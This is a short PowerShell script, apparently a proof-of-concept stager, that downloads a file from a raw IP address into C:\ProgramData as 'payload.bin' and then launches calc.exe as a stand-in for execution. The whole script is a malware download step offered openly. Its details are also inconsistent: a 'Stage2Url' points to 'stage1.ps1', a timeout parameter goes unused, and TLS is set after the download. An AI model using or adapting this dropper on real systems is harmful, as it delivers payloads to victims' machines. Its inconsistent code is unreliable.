
[CmdletBinding()]
param(
    [string]$Stage2Url = "https://203.0.113.69/stage1.ps1",
    [string]$LocalPath = 'C:\ProgramData\payload.bin',
    [int]$TransferTimeout = 103
)
Invoke-WebRequest -Uri $Stage2Url -OutFile $LocalPath -UseBasicParsing
Start-Process -FilePath "calc.exe"
$PSDefaultParameterValues["Out-File:Encoding"] = "utf8"
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
